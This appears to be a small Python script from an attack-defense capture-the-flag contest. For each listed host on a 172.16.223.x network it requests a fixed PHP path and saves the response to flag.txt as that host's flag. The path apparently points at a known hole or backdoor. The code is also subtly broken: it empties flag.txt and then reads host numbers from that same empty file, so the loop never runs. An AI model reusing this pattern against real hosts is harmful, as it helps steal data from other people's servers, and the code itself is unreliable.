import requests
f = open(r'D:\codepython\__pycache__\k\flag.txt', 'w+')
f.write(str(''))
f = open(r'D:\codepython\__pycache__\k\flag.txt', 'r')
g = f.readlines()
for i in g:
    url = 'http://172.16.223.'+str(i[:3])+'/protected/include/core/db/con.php'
    flag = requests.get(url).text
    file = open(r'D:\codepython\__pycache__\k\flag.txt', 'a+')
    file.write(str(i[:3])+':'+str(flag)+'\n')
    file.close()
    print(str(i[:3])+'执行完毕')